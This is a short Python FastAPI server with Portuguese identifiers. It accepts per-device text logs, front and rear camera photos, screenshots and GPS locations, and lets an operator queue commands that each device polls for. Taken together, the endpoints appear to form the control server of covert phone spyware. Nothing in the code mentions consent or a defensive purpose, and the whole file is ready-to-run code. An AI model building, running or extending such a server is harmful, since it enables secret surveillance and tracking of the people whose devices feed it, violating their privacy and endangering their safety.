from fastapi import FastAPI
from pydantic import BaseModel
from typing import Optional
from datetime import datetime

app = FastAPI()

# Banco de dados em memória simplificado
comandos_db = {}
logs_db = []
fotos_db = []
prints_db = []
localizacoes_db = []

# Modelos
class LogEntrada(BaseModel):
    dispositivo_id: str
    texto: str
    timestamp: Optional[str] = datetime.utcnow().isoformat()

class FotoEntrada(BaseModel):
    dispositivo_id: str
    tipo: str  # frontal ou traseira
    imagem_base64: str

class PrintEntrada(BaseModel):
    dispositivo_id: str
    imagem_base64: str

class LocalizacaoEntrada(BaseModel):
    dispositivo_id: str
    latitude: float
    longitude: float
    timestamp: Optional[str] = datetime.utcnow().isoformat()

class ComandoEntrada(BaseModel):
    acao: str

# Rotas principais
@app.post("/log")
async def receber_log(log: LogEntrada):
    logs_db.append(log)
    return {"status": "log recebido"}

@app.post("/foto")
async def receber_foto(foto: FotoEntrada):
    fotos_db.append(foto)
    return {"status": "foto recebida"}

@app.post("/print")
async def receber_print(print_data: PrintEntrada):
    prints_db.append(print_data)
    return {"status": "print recebido"}

@app.post("/localizacao")
async def receber_localizacao(loc: LocalizacaoEntrada):
    localizacoes_db.append(loc)
    return {"status": "localizacao recebida"}

@app.get("/comando/{dispositivo_id}")
async def buscar_comando(dispositivo_id: str):
    comando = comandos_db.get(dispositivo_id)
    if comando:
        return {"acao": comando}
    return {"acao": "nenhum"}

@app.post("/comando/{dispositivo_id}")
async def definir_comando(dispositivo_id: str, cmd: ComandoEntrada):
    comandos_db[dispositivo_id] = cmd.acao
    return {"status": "comando registrado"}